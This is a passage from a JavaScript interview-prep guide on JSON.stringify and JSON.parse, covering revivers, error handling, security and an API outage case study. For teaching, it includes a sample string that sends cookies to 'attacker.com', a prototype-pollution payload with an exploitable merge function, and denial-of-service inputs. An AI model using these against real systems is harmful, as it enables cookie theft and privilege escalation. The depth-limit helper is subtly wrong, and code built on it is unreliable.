**Interview Answer Template:**

> "JSON.stringify converts JavaScript values to JSON strings. It takes three parameters: **value** (the data to convert), **replacer** (optional function or array to filter/transform properties), and **space** (optional indentation for readability).
>
> It handles primitives, objects, and arrays, but has special behavior for edge cases:
> - `undefined`, functions, and symbols are **omitted from objects** or converted to `null` in arrays
> - Dates become **ISO strings**
> - Circular references **throw errors**
> - BigInt **throws errors**
>
> For custom serialization, objects can define a **toJSON()** method. The replacer is useful for filtering sensitive data like passwords, and space makes output human-readable for logging or config files.
>
> In production, always handle circular references (using WeakSet) and errors (try-catch), especially when serializing complex objects like Mongoose documents."

**Practice Pattern (Remember This):**

```javascript
// The "Safe Stringify" pattern - memorize this for interviews
function safeStringify(obj, indent = 2) {
  const seen = new WeakSet();

  return JSON.stringify(obj, (key, value) => {
    // 1. Handle circular references
    if (typeof value === 'object' && value !== null) {
      if (seen.has(value)) return '[Circular]';
      seen.add(value);
    }

    // 2. Filter sensitive fields
    if (['password', 'apiKey'].includes(key)) {
      return '[REDACTED]';
    }

    // 3. Handle BigInt
    if (typeof value === 'bigint') {
      return value.toString();
    }

    return value;
  }, indent);
}

// Use this everywhere instead of plain JSON.stringify!
```

**When to Use Each Parameter (Quick Guide):**

- **No parameters:** Quick serialization for simple data
  ```javascript
  JSON.stringify({ id: 1, name: 'Alice' })
  ```

- **Replacer function:** Filter/transform data dynamically
  ```javascript
  JSON.stringify(user, (k, v) => k === 'password' ? undefined : v)
  ```

- **Replacer array:** Whitelist specific properties
  ```javascript
  JSON.stringify(user, ['id', 'name']) // Only include id and name
  ```

- **Space:** Debugging, logging, config files
  ```javascript
  console.log(JSON.stringify(user, null, 2)); // Pretty-print
  ```

**Key Gotcha to Remember:**

```javascript
// ❌ This is NOT the same as omitting the property
{ password: undefined } // Property exists with undefined value

// ✅ This omits the property entirely
JSON.stringify({ password: 'secret' }, (k, v) => k === 'password' ? undefined : v)
// Result: {} - password property is gone
```

**toJSON() in Plain English:**

If an object has a `toJSON()` method, JSON.stringify calls it first and serializes **the return value** instead of the original object.

```javascript
const user = {
  name: 'Alice',
  password: 'secret',
  toJSON() {
    return { name: this.name }; // Only return name, hide password
  }
};

JSON.stringify(user); // {"name":"Alice"} - password automatically excluded
```

It's like having a "public version" of your object that's safe to share.


</details>

---

## Question 2: How does JSON.parse() work and how do you handle errors?

**Difficulty:** 🟡 Medium
**Frequency:** ⭐⭐⭐⭐⭐
**Time:** 8-10 minutes
**Companies:** Amazon, Netflix, Shopify, PayPal

### Question

Explain how `JSON.parse()` works in JavaScript. What are its two parameters? How do you handle parsing errors? What is the reviver function and when would you use it? What are the security concerns with JSON parsing (prototype pollution, JSON injection)? How does JSON.parse compare to `eval()` in terms of security?

### Answer

**JSON.parse()** converts JSON strings back into JavaScript values. It accepts two parameters:

**Syntax:**
```javascript
JSON.parse(text, reviver)
```

**Parameters:**

1. **`text`** (required): JSON string to parse
2. **`reviver`** (optional): Function to transform parsed values

**Error Handling:**

JSON.parse throws **SyntaxError** for invalid JSON:
- Malformed JSON syntax
- Trailing commas
- Single quotes (must use double quotes)
- Undefined values
- Comments

**Always use try-catch:**
```javascript
try {
  const data = JSON.parse(jsonString);
} catch (error) {
  console.error('Parse failed:', error.message);
}
```

**Reviver Function:**

Called for each property during parsing, in **depth-first leaf-to-root** order:
- Parameters: `(key, value)`
- Return value replaces the parsed value
- Root object has `key = ""`

**Common Use Cases:**
- Restore Date objects from ISO strings
- Convert string numbers to BigInt
- Validate/sanitize values
- Transform property names

**Security Concerns:**

1. **Prototype Pollution (via unsafe merging, not JSON.parse itself):**
   - `JSON.parse()` alone is safe — it creates `"__proto__"` as a plain own data property, not through the prototype setter, so it does **not** modify `Object.prototype`
   - The risk appears when the parsed object is later copied with an unsafe recursive merge/extend utility that uses bracket-notation assignment
   - Attack payload: `{"__proto__": {"isAdmin": true}}`

2. **JSON Injection:**
   - Untrusted JSON from user input
   - Always validate before parsing

3. **Denial of Service:**
   - Deeply nested objects (stack overflow)
   - Huge JSON strings (memory exhaustion)

**JSON.parse() vs eval():**

| Aspect | JSON.parse() | eval() |
|--------|-------------|--------|
| **Security** | Safe (JSON only) | Dangerous (executes any code) |
| **Performance** | Fast (optimized parser) | Slower (full JS evaluation) |
| **Errors** | SyntaxError | Any JS error |
| **Use Case** | Deserialize JSON | **NEVER use for JSON** |

**When to Use Reviver:**
- Deserializing dates, BigInt, custom classes
- Validation during parsing
- Type coercion (string → number)
- Property renaming

### Code Example

```javascript
// ============================================
// 1. BASIC USAGE
// ============================================

const jsonString = '{"name":"Alice","age":30,"active":true}';

const obj = JSON.parse(jsonString);
console.log(obj);
// { name: 'Alice', age: 30, active: true }

console.log(typeof obj); // 'object'
console.log(obj.name);   // 'Alice'

// Parse arrays
const jsonArray = '[1, 2, 3, "hello", true]';
console.log(JSON.parse(jsonArray));
// [1, 2, 3, 'hello', true]

// Parse primitives
console.log(JSON.parse('123'));     // 123 (number)
console.log(JSON.parse('"hello"')); // 'hello' (string)
console.log(JSON.parse('true'));    // true (boolean)
console.log(JSON.parse('null'));    // null

// ============================================
// 2. ERROR HANDLING - SYNTAXERROR
// ============================================

// ❌ WRONG: No error handling
const badJson1 = '{"name": "Alice",}'; // Trailing comma
const result1 = JSON.parse(badJson1); // Throws SyntaxError - app crashes!

// ✅ CORRECT: Always use try-catch
try {
  const result = JSON.parse(badJson1);
  console.log(result);
} catch (error) {
  console.error('Parse error:', error.message);
  // Parse error: Unexpected token } in JSON at position 18
}

// Common JSON errors:

// 1. Trailing commas
try {
  JSON.parse('{"a": 1, "b": 2,}');
} catch (e) {
  console.error(e.message); // Unexpected token } in JSON
}

// 2. Single quotes (must use double quotes)
try {
  JSON.parse("{'name': 'Alice'}");
} catch (e) {
  console.error(e.message); // Unexpected token ' in JSON
}

// 3. Undefined values
try {
  JSON.parse('{"value": undefined}');
} catch (e) {
  console.error(e.message); // Unexpected token u in JSON
}

// 4. Comments (not allowed in JSON)
try {
  JSON.parse('{"name": "Alice" /* comment */}');
} catch (e) {
  console.error(e.message); // Unexpected token / in JSON
}

// 5. Unquoted keys
try {
  JSON.parse('{name: "Alice"}');
} catch (e) {
  console.error(e.message); // Unexpected token n in JSON
}

// ✅ CORRECT: Comprehensive error handling
function safeParse(jsonString, fallback = null) {
  try {
    return JSON.parse(jsonString);
  } catch (error) {
    console.error('JSON parse failed:', error.message);
    console.error('Invalid JSON:', jsonString);
    return fallback; // Return default value
  }
}

const data = safeParse('invalid json', { default: true });
console.log(data); // { default: true }

// ============================================
// 3. REVIVER FUNCTION - DATE RESTORATION
// ============================================

// Problem: Dates are serialized as ISO strings
const user = {
  name: 'Alice',
  createdAt: new Date('2024-01-15'),
  updatedAt: new Date('2024-01-20')
};

const json = JSON.stringify(user);
console.log(json);
// {"name":"Alice","createdAt":"2024-01-15T00:00:00.000Z","updatedAt":"2024-01-20T00:00:00.000Z"}

// ❌ WRONG: Dates are strings, not Date objects
const parsed1 = JSON.parse(json);
console.log(parsed1.createdAt instanceof Date); // false
console.log(typeof parsed1.createdAt);          // 'string'

// ✅ CORRECT: Use reviver to restore Dates
const parsed2 = JSON.parse(json, (key, value) => {
  // Check if value looks like ISO date string
  if (typeof value === 'string') {
    const isoDateRegex = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/;
    if (isoDateRegex.test(value)) {
      return new Date(value); // Convert to Date object
    }
  }
  return value;
});

console.log(parsed2.createdAt instanceof Date); // true
console.log(parsed2.createdAt.getFullYear());   // 2024

// Alternative: Specific key names
const parsed3 = JSON.parse(json, (key, value) => {
  if (['createdAt', 'updatedAt', 'timestamp'].includes(key)) {
    return new Date(value);
  }
  return value;
});

// ============================================
// 4. REVIVER FUNCTION - TYPE RESTORATION
// ============================================

// Restore BigInt
const bigIntJson = '{"userId":123,"balance":"9007199254740991"}';

const restored = JSON.parse(bigIntJson, (key, value) => {
  if (key === 'balance') {
    return BigInt(value); // Convert string to BigInt
  }
  return value;
});

console.log(typeof restored.balance); // 'bigint'
console.log(restored.balance);        // 9007199254740991n

// Restore Maps from serialized format
const mapJson = '{"dataType":"Map","entries":[["a",1],["b",2]]}';

const restoredMap = JSON.parse(mapJson, function(key, value) {
  if (key === '' && value.dataType === 'Map') {
    return new Map(value.entries);
  }
  return value;
});

console.log(restoredMap instanceof Map); // true
console.log(restoredMap.get('a'));       // 1

// ============================================
// 5. REVIVER FUNCTION - VALIDATION
// ============================================

// Validate values during parsing
const configJson = '{"port":3000,"timeout":-5000,"maxConnections":100}';

try {
  const config = JSON.parse(configJson, (key, value) => {
    // Validate timeout is positive
    if (key === 'timeout' && value < 0) {
      throw new Error('Timeout must be positive');
    }

    // Validate port range
    if (key === 'port' && (value < 1024 || value > 65535)) {
      throw new Error('Port must be between 1024-65535');
    }

    return value;
  });
} catch (error) {
  console.error('Validation failed:', error.message);
  // Validation failed: Timeout must be positive
}

// ============================================
// 6. REVIVER EXECUTION ORDER (DEPTH-FIRST, LEAF-TO-ROOT)
// ============================================

const nestedJson = JSON.stringify({
  level1: {
    level2: {
      level3: 'deep'
    }
  }
});

JSON.parse(nestedJson, (key, value) => {
  console.log(`Key: "${key}", Value:`, value);
  return value;
});

// Output order (leaf-to-root):
// Key: "level3", Value: deep
// Key: "level2", Value: { level3: 'deep' }
// Key: "level1", Value: { level2: { level3: 'deep' } }
// Key: "", Value: { level1: { level2: { level3: 'deep' } } }

// This is OPPOSITE of stringify replacer (which is depth-first, root-to-leaf)

// ============================================
// 7. VALIDATION BEFORE PARSING
// ============================================

// ✅ CORRECT: Validate JSON structure before parsing
function isValidJSON(str) {
  try {
    JSON.parse(str);
    return true;
  } catch (e) {
    return false;
  }
}

const input = getUserInput(); // Untrusted input

if (isValidJSON(input)) {
  const data = JSON.parse(input);
  processData(data);
} else {
  console.error('Invalid JSON input');
}

// Validate content type for API responses
async function fetchJSON(url) {
  const response = await fetch(url);

  // ✅ Check Content-Type header
  const contentType = response.headers.get('content-type');
  if (!contentType || !contentType.includes('application/json')) {
    throw new Error(`Expected JSON, got ${contentType}`);
  }

  const text = await response.text();

  try {
    return JSON.parse(text);
  } catch (error) {
    console.error('Response was not valid JSON:', text.substring(0, 100));
    throw new Error('Invalid JSON response');
  }
}

// ============================================
// 8. SECURITY: PROTOTYPE POLLUTION
// ============================================

// ⚠️ JSON.parse() ITSELF IS SAFE — it does not pollute Object.prototype
const maliciousJson = '{"__proto__": {"isAdmin": true}}';

const obj1 = JSON.parse(maliciousJson);
console.log(obj1.isAdmin); // undefined ("__proto__" is just an own property here)

// The prototype chain is untouched:
const newObj = {};
console.log(newObj.isAdmin); // undefined (NOT polluted!)
console.log(Object.getPrototypeOf(obj1) === Object.prototype); // true (unchanged)

// How it actually works:
// JSON.parse uses CreateDataProperty internally, which defines an OWN
// property literally named "__proto__" — it does NOT invoke the
// Object.prototype.__proto__ accessor, so Object.prototype is never touched.
// The real danger is passing obj1 into an UNSAFE recursive merge/extend
// function that assigns via `target[key] = value` (which DOES walk the
// prototype chain and can pollute Object.prototype through nested keys).
// Defenses below (blocking dangerous keys, no-prototype objects) are still
// good hygiene for data you plan to merge elsewhere.

// ✅ CORRECT: Sanitize parsed data
function sanitizeParsed(jsonString) {
  const obj = JSON.parse(jsonString);

  // Remove dangerous properties
  delete obj.__proto__;
  delete obj.constructor;
  delete obj.prototype;

  return obj;
}

const safe = sanitizeParsed(maliciousJson);
const testObj = {};
console.log(testObj.isAdmin); // undefined (safe)

// ✅ BETTER: Use Object.create(null) to avoid prototype
function safeParse(jsonString) {
  const obj = JSON.parse(jsonString);

  // Create object with no prototype
  const safeObj = Object.create(null);

  // Copy only own properties (exclude __proto__)
  for (const key of Object.keys(obj)) {
    if (key !== '__proto__' && key !== 'constructor') {
      safeObj[key] = obj[key];
    }
  }

  return safeObj;
}

// ✅ BEST: Use reviver to block dangerous keys
function parseWithProtection(jsonString) {
  return JSON.parse(jsonString, (key, value) => {
    // Block prototype pollution keys
    if (['__proto__', 'constructor', 'prototype'].includes(key)) {
      return undefined; // Omit the property
    }
    return value;
  });
}

const protected = parseWithProtection(maliciousJson);
const testObj2 = {};
console.log(testObj2.isAdmin); // undefined (safe)

// ============================================
// 9. SECURITY: JSON INJECTION
// ============================================

// ❌ DANGEROUS: User input directly parsed
app.post('/api/update-profile', (req, res) => {
  const userInput = req.body.data; // User-controlled JSON string

  const profile = JSON.parse(userInput); // UNSAFE!

  // User could inject: {"role": "admin", "permissions": ["all"]}
  db.updateProfile(profile);
});

// ✅ CORRECT: Validate and sanitize
app.post('/api/update-profile', (req, res) => {
  const userInput = req.body.data;

  try {
    const profile = JSON.parse(userInput);

    // Whitelist allowed fields
    const safeProfile = {
      name: profile.name,
      email: profile.email,
      // Role and permissions are NOT user-controllable
    };

    // Validate types
    if (typeof safeProfile.name !== 'string' ||
        typeof safeProfile.email !== 'string') {
      return res.status(400).json({ error: 'Invalid data types' });
    }

    db.updateProfile(safeProfile);
  } catch (error) {
    res.status(400).json({ error: 'Invalid JSON' });
  }
});

// ============================================
// 10. SECURITY: DENIAL OF SERVICE
// ============================================

// Attack 1: Deeply nested objects (stack overflow)
const deeplyNested = '{"a":'.repeat(10000) + '1' + '}'.repeat(10000);

try {
  JSON.parse(deeplyNested); // May cause stack overflow
} catch (error) {
  console.error('Stack overflow:', error.message);
}

// Attack 2: Huge JSON strings (memory exhaustion)
const hugeJson = '{"data":"' + 'x'.repeat(100_000_000) + '"}'; // 100 MB string

try {
  JSON.parse(hugeJson); // May exhaust memory
} catch (error) {
  console.error('Out of memory:', error.message);
}

// ✅ CORRECT: Limit JSON size and depth
function safeLimitedParse(jsonString, maxSize = 1_000_000, maxDepth = 20) {
  // Check size
  if (jsonString.length > maxSize) {
    throw new Error(`JSON too large: ${jsonString.length} > ${maxSize}`);
  }

  // Parse with depth tracking
  let depth = 0;

  return JSON.parse(jsonString, function(key, value) {
    // Track nesting depth (count objects/arrays)
    if (typeof value === 'object' && value !== null) {
      depth++;
      if (depth > maxDepth) {
        throw new Error(`JSON too deeply nested: ${depth} > ${maxDepth}`);
      }
    }
    return value;
  });
}

// ============================================
// 11. JSON.parse() vs eval() COMPARISON
// ============================================

const jsonStr = '{"name":"Alice","age":30}';

// ✅ JSON.parse: Safe, only parses JSON
const obj2 = JSON.parse(jsonStr);
console.log(obj2); // { name: 'Alice', age: 30 }

// ❌ eval: DANGEROUS - executes arbitrary code
const maliciousInput = '{"name":"Alice","age":30}; deleteAllUsers(); {"safe":true}';

// This would execute deleteAllUsers()!
// const obj3 = eval('(' + maliciousInput + ')'); // NEVER DO THIS!

// Example attack:
const attackJson = '{"name":"Alice"}; fetch("https://attacker.com?cookie=" + document.cookie);';
// eval would send cookies to attacker!

// JSON.parse would safely throw SyntaxError:
try {
  JSON.parse(attackJson);
} catch (error) {
  console.error('Safely rejected:', error.message);
  // Unexpected token ; in JSON at position 16
}

// ✅ ALWAYS use JSON.parse for JSON data
// ❌ NEVER use eval for any user input

// ============================================
// 12. REAL API RESPONSE PARSING
// ============================================

// ✅ CORRECT: Comprehensive API response handling
async function fetchUserData(userId) {
  try {
    const response = await fetch(`/api/users/${userId}`);

    // Check HTTP status
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    // Validate Content-Type
    const contentType = response.headers.get('content-type');
    if (!contentType || !contentType.includes('application/json')) {
      throw new Error(`Expected JSON, got ${contentType}`);
    }

    // Get response text
    const text = await response.text();

    // Check for empty response
    if (!text || text.trim() === '') {
      throw new Error('Empty response body');
    }

    // Parse JSON
    const data = JSON.parse(text, (key, value) => {
      // Restore dates
      if (key.endsWith('At') || key === 'timestamp') {
        return new Date(value);
      }
      return value;
    });

    // Validate structure
    if (!data.id || !data.name) {
      throw new Error('Invalid user data structure');
    }

    return data;

  } catch (error) {
    console.error('Failed to fetch user:', error.message);
    throw error;
  }
}

// Usage
fetchUserData(123)
  .then(user => console.log(user))
  .catch(error => console.error('Error:', error.message));
```


<details>
<summary><strong>🔍 Deep Dive: JSON.stringify() and JSON.parse()</strong></summary>


**V8 JSON.parse Implementation:**

V8 uses a highly optimized JSON parser written in C++ (not JavaScript):

1. **Lexical Analysis (Tokenization):**
   - Scans input string character by character
   - Identifies tokens: `{`, `}`, `[`, `]`, `:`, `,`, strings, numbers, booleans, null
   - Validates JSON syntax

2. **Parsing (Syntax Tree Construction):**
   - Builds abstract syntax tree (AST)
   - Recursive descent parser
   - Validates structure (matching braces, proper nesting)

3. **Value Construction:**
   - Creates JavaScript objects/arrays
   - Allocates memory in heap
   - Applies reviver function if provided

**Parsing Algorithm (Simplified):**

```
ParseValue(tokens):
  token = peek(tokens)

  if token == '{':
    return ParseObject(tokens)
  else if token == '[':
    return ParseArray(tokens)
  else if token == STRING:
    return consume(tokens)
  else if token == NUMBER:
    return parseNumber(consume(tokens))
  else if token == TRUE:
    consume(tokens); return true
  else if token == FALSE:
    consume(tokens); return false
  else if token == NULL:
    consume(tokens); return null
  else:
    throw SyntaxError

ParseObject(tokens):
  consume('{')
  obj = {}

  while peek(tokens) != '}':
    key = consume(STRING)
    consume(':')
    value = ParseValue(tokens)
    obj[key] = value

    if peek(tokens) == ',':
      consume(',')
    else:
      break

  consume('}')
  return obj
```

**Reviver Execution Order (Depth-First, Leaf-to-Root):**

Unlike stringify's replacer (root-to-leaf), parse's reviver goes **leaf-to-root**:

```javascript
const json = '{"a":{"b":{"c":1}}}';

JSON.parse(json, (key, value) => {
  console.log(`Processing: key="${key}"`);
  return value;
});

// Output order:
// Processing: key="c"    (deepest leaf)
// Processing: key="b"    (parent of c)
// Processing: key="a"    (parent of b)
// Processing: key=""     (root object)
```

**Why leaf-to-root?**
- Allows transformation of nested values before parent sees them
- Parent can access already-transformed children

**Example:**
```javascript
const json = '{"user":{"createdAt":"2024-01-15T00:00:00Z"}}';

JSON.parse(json, (key, value) => {
  if (key === 'createdAt') {
    return new Date(value); // Transform date string
  }

  if (key === 'user') {
    // By now, value.createdAt is already a Date object
    console.log(value.createdAt instanceof Date); // true
  }

  return value;
});
```

**Performance Characteristics:**

- **Time Complexity:** O(n) where n = length of JSON string
  - Single pass through input
  - Each character processed once

- **Space Complexity:** O(d) where d = maximum depth
  - Call stack for recursion
  - Additional O(n) for storing parsed objects

**Memory Allocation:**

```javascript
// Input: 100 KB JSON string
const json = '{"large": "' + 'x'.repeat(100000) + '"}';

// Memory during parsing:
// 1. Input string: 100 KB (immutable)
// 2. Parser state: ~10 KB (tokens, stack)
// 3. Output object: 100 KB (new allocation)
// Peak: ~210 KB
```

**JIT Optimization:**

V8's parser is implemented in C++ (not JIT-compiled JavaScript), but repeated parsing patterns benefit from:
- **Inline Caching:** Property access paths cached
- **Hidden Classes:** If parsed objects have consistent shapes, V8 optimizes property access

```javascript
// Parsing 1000 identical structures
for (let i = 0; i < 1000; i++) {
  JSON.parse('{"id":1,"name":"Alice","age":30}');
}
// V8 learns the structure and optimizes memory layout
// Faster property access on resulting objects
```

**Security: Why JSON.parse is Safe (vs eval):**

```javascript
// JSON.parse uses a dedicated parser:
// - Only recognizes JSON grammar
// - No code execution
// - Predictable behavior

JSON.parse('{"name":"Alice"}'); // ✅ Parses safely

JSON.parse('{"name":"Alice"}; maliciousCode()');
// ❌ SyntaxError (rejects immediately)

// eval() uses the full JavaScript engine:
// - Executes ANY valid JavaScript
// - Can access global scope, DOM, etc.
// - Unpredictable side effects

eval('({"name":"Alice"})'); // ✅ Works

eval('({"name":"Alice"}); deleteDatabase()');
// ❌ DISASTER: Executes malicious code!
```

**Prototype Pollution Attack Vector:**

```javascript
// JSON.parse() itself does NOT pollute the prototype:
const malicious = '{"__proto__":{"isAdmin":true}}';

const obj = JSON.parse(malicious);
// 1. Parser creates: obj = {}
// 2. Parser uses CreateDataProperty to set an OWN property
//    literally named "__proto__" (bypasses the accessor/setter)
// 3. Object.prototype is never touched

const test = {};
console.log(test.isAdmin); // undefined (NOT polluted)

// The real attack requires the parsed object to flow into an UNSAFE
// recursive merge/extend function, e.g.:
function unsafeMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      unsafeMerge(target[key], source[key]); // target["__proto__"] resolves
      // to the real Object.prototype via the accessor, and nested writes
      // land on it — THIS is what pollutes every object.
    } else {
      target[key] = source[key];
    }
  }
}

unsafeMerge({}, obj); // Only now does Object.prototype get polluted
console.log(({}).isAdmin); // true (polluted by the merge, not by JSON.parse)

// Why it's dangerous once polluted:
if (req.user.isAdmin) {
  // Attacker just became admin!
  grantAdminAccess();
}
```

**Defense Mechanisms:**

- `JSON.parse()` on its own is already safe from `__proto__` pollution (spec behavior, not engine-specific)
- The real risk lives in how the parsed data is later merged/copied — audit deep-merge, `extend`, and recursive-assign utilities for unsafe `target[key] = value` patterns
- Use `Object.create(null)` for prototype-less objects when merging untrusted data
- Libraries like `secure-json-parse` add extra validation for defense-in-depth

**Benchmarks (1000 iterations, 10KB JSON string):**

```javascript
const json = JSON.stringify({ /* 10KB data */ });

// JSON.parse: 50ms baseline
console.time('parse');
for (let i = 0; i < 1000; i++) {
  JSON.parse(json);
}
console.timeEnd('parse');
// parse: 50ms

// With reviver: 120ms (2.4x slower)
console.time('parse-reviver');
for (let i = 0; i < 1000; i++) {
  JSON.parse(json, (k, v) => v);
}
console.timeEnd('parse-reviver');
// parse-reviver: 120ms

// eval (for comparison): 350ms (7x slower + UNSAFE)
console.time('eval');
for (let i = 0; i < 1000; i++) {
  eval('(' + json + ')');
}
console.timeEnd('eval');
// eval: 350ms
```

**Comparison with Libraries:**

| Parser | Speed | Security | Features |
|--------|-------|----------|----------|
| **JSON.parse** | Fast | Good (with care) | Basic |
| **secure-json-parse** | Slower | Better (anti-pollution) | Prototype protection |
| **json5** | Slower | Good | Comments, trailing commas |
| **yaml** | Slowest | Good | Rich syntax, references |


</details>

---


<details>
<summary><strong>🐛 Real-World Scenario: JSON.stringify() and JSON.parse()</strong></summary>


**Context: Frontend Dashboard Consuming Third-Party Weather API**

Our React-based analytics dashboard integrated a third-party weather API to display weather conditions for delivery routes. The dashboard had 50,000+ daily active users across 200+ cities.

**The Problem:**

**Date:** August 8, 2024, 2:13 PM
**Alert:** Sentry reported sudden spike in JavaScript errors:

```
SyntaxError: Unexpected token < in JSON at position 0
  at JSON.parse (<anonymous>)
  at WeatherService.fetchWeather (weather-service.js:23:28)
  at Dashboard.componentDidMount (dashboard.jsx:45:32)
```

**Impact:**
- **User Reports:** 156 users reported "blank dashboard" within 30 minutes
- **Affected Users:** ~15% of daily active users (7,500 users)
- **Duration:** 4 hours (2:13 PM - 6:15 PM)
- **Support Tickets:** 89 urgent tickets
- **Lost Productivity:** Estimated 300 work-hours (users couldn't access delivery data)

**Initial Debugging:**

1. **Sentry Error Tracking:**
   ```javascript
   // Error logged in Sentry:
   {
     message: "Unexpected token < in JSON at position 0",
     level: "error",
     tags: {
       endpoint: "/api/weather",
       userId: "various",
       browser: "Chrome 127"
     },
     breadcrumbs: [
       { message: "Fetching weather data", level: "info" },
       { message: "Response received", level: "info" },
       { message: "Parsing JSON", level: "error" }
     ]
   }
   ```

2. **Network Tab Inspection (Chrome DevTools):**
   ```
   Request: GET https://weather-api.example.com/v1/current?city=NYC
   Status: 503 Service Unavailable
   Content-Type: text/html; charset=utf-8  ← PROBLEM!

   Response Body:
   <!DOCTYPE html>
   <html>
   <head><title>503 Service Unavailable</title></head>
   <body>
   <h1>Service Temporarily Unavailable</h1>
   <p>Please try again later.</p>
   </body>
   </html>
   ```

3. **Code Review:**
   ```javascript
   // weather-service.js (BUGGY VERSION)
   class WeatherService {
     async fetchWeather(city) {
       const response = await fetch(`https://weather-api.example.com/v1/current?city=${city}`);

       // ❌ PROBLEM: Assumes response is always JSON
       const data = JSON.parse(await response.text());

       return {
         temperature: data.temp,
         condition: data.condition,
         humidity: data.humidity
       };
     }
   }
   ```

**Root Cause Analysis:**

1. **Third-party API degradation:**
   - Weather API experienced server overload
   - Started returning **503 HTML error pages** instead of JSON
   - No JSON error format (violates API contract)

2. **Missing validation:**
   - Code didn't check HTTP status code
   - Code didn't validate Content-Type header
   - Code didn't handle JSON.parse errors

3. **No fallback mechanism:**
   - Dashboard crashed instead of showing fallback UI
   - No cached weather data
   - No graceful degradation

**Debugging Timeline:**

- **2:13 PM:** First error appears in Sentry
- **2:25 PM:** On-call engineer investigates, sees "Unexpected token <"
- **2:40 PM:** Network tab reveals HTML error pages
- **2:55 PM:** Root cause identified (API returning HTML instead of JSON)
- **3:15 PM:** Temporary fix deployed (try-catch + fallback)
- **4:30 PM:** Weather API recovers (503s stop)
- **6:15 PM:** All users able to access dashboard again

**The Solution:**

**Immediate Fix (Deployed 3:15 PM):**

```javascript
// weather-service.js (TEMPORARY FIX)
class WeatherService {
  async fetchWeather(city) {
    try {
      const response = await fetch(`https://weather-api.example.com/v1/current?city=${city}`);

      // ✅ Add basic error handling
      if (!response.ok) {
        console.warn(`Weather API returned ${response.status}`);
        return this.getFallbackWeather(city);
      }

      const data = JSON.parse(await response.text());
      return {
        temperature: data.temp,
        condition: data.condition,
        humidity: data.humidity
      };
    } catch (error) {
      console.error('Weather fetch failed:', error.message);
      return this.getFallbackWeather(city); // Show cached/default data
    }
  }

  getFallbackWeather(city) {
    return {
      temperature: '-- °F',
      condition: 'Data unavailable',
      humidity: '--',
      isFallback: true
    };
  }
}
```

**Permanent Fix (Deployed Next Day):**

```javascript
// weather-service.js (v2.0.0 - PRODUCTION READY)
class WeatherService {
  constructor() {
    this.cache = new Map(); // LRU cache
    this.cacheTimeout = 5 * 60 * 1000; // 5 minutes
  }

  async fetchWeather(city) {
    try {
      // Check cache first
      const cached = this.cache.get(city);
      if (cached && Date.now() - cached.timestamp < this.cacheTimeout) {
        return { ...cached.data, fromCache: true };
      }

      const response = await fetch(
        `https://weather-api.example.com/v1/current?city=${city}`,
        { timeout: 5000 } // 5s timeout
      );

      // ✅ 1. Validate HTTP status
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      // ✅ 2. Validate Content-Type
      const contentType = response.headers.get('content-type');
      if (!contentType || !contentType.includes('application/json')) {
        throw new Error(`Expected JSON, got ${contentType || 'unknown'}`);
      }

      // ✅ 3. Get response text (for better error messages)
      const text = await response.text();

      // ✅ 4. Validate non-empty response
      if (!text || text.trim() === '') {
        throw new Error('Empty response body');
      }

      // ✅ 5. Parse JSON with error handling
      let data;
      try {
        data = JSON.parse(text);
      } catch (parseError) {
        console.error('JSON parse failed:', text.substring(0, 100));
        throw new Error(`Invalid JSON: ${parseError.message}`);
      }

      // ✅ 6. Validate response structure
      if (!data.temp || !data.condition) {
        throw new Error('Invalid weather data structure');
      }

      // ✅ 7. Transform and cache
      const weather = {
        temperature: data.temp,
        condition: data.condition,
        humidity: data.humidity,
        timestamp: Date.now()
      };

      this.cache.set(city, { data: weather, timestamp: Date.now() });

      return weather;

    } catch (error) {
      // ✅ 8. Comprehensive error logging
      console.error('Weather fetch failed:', {
        city,
        error: error.message,
        stack: error.stack
      });

      // ✅ 9. Try to return cached data (even if stale)
      const staleCache = this.cache.get(city);
      if (staleCache) {
        return {
          ...staleCache.data,
          fromCache: true,
          stale: true,
          error: 'Using stale cached data'
        };
      }

      // ✅ 10. Final fallback
      return this.getFallbackWeather(city, error.message);
    }
  }

  getFallbackWeather(city, errorMessage) {
    return {
      temperature: '-- °F',
      condition: 'Data unavailable',
      humidity: '--',
      isFallback: true,
      error: errorMessage,
      city
    };
  }
}
```

**Added API Health Monitoring:**

```javascript
// monitoring/api-health.js
class APIHealthMonitor {
  constructor() {
    this.healthMetrics = {
      successCount: 0,
      errorCount: 0,
      lastError: null,
      lastSuccess: null
    };
  }

  async checkHealth() {
    try {
      const response = await fetch('https://weather-api.example.com/health');

      if (response.ok) {
        this.healthMetrics.successCount++;
        this.healthMetrics.lastSuccess = new Date();
        return { status: 'healthy' };
      } else {
        throw new Error(`Health check failed: ${response.status}`);
      }
    } catch (error) {
      this.healthMetrics.errorCount++;
      this.healthMetrics.lastError = {
        message: error.message,
        timestamp: new Date()
      };

      // Alert if error rate > 10%
      const errorRate = this.healthMetrics.errorCount /
        (this.healthMetrics.successCount + this.healthMetrics.errorCount);

      if (errorRate > 0.1) {
        this.sendAlert('High API error rate', errorRate);
      }

      return { status: 'unhealthy', error: error.message };
    }
  }

  sendAlert(message, data) {
    // Send to Slack, PagerDuty, etc.
    console.error('ALERT:', message, data);
  }
}

// Run health checks every minute
setInterval(() => {
  new APIHealthMonitor().checkHealth();
}, 60000);
```

**Updated Dashboard UI (Graceful Degradation):**

```jsx
// Dashboard.jsx
function Dashboard() {
  const [weather, setWeather] = useState(null);
  const [weatherError, setWeatherError] = useState(null);

  useEffect(() => {
    fetchWeather('NYC')
      .then(data => {
        setWeather(data);
        if (data.isFallback || data.fromCache) {
          setWeatherError(data.error || 'Using cached data');
        }
      })
      .catch(err => {
        setWeatherError(err.message);
      });
  }, []);

  return (
    <div className="dashboard">
      <h1>Delivery Dashboard</h1>

      {/* ✅ Show weather with warning if fallback/cached */}
      <div className="weather-widget">
        <h2>Current Weather</h2>
        {weather && (
          <>
            <p>Temperature: {weather.temperature}</p>
            <p>Condition: {weather.condition}</p>
            {(weather.isFallback || weather.stale) && (
              <div className="warning">
                ⚠️ Weather data may be outdated or unavailable
              </div>
            )}
          </>
        )}
        {weatherError && (
          <div className="error">
            Unable to fetch live weather data. Showing cached/default values.
          </div>
        )}
      </div>

      {/* Rest of dashboard - continues to function */}
      <DeliveryRoutes />
      <Analytics />
    </div>
  );
}
```

**Results After Fix:**

- **Crashes:** 0 JSON parse errors over next 3 months
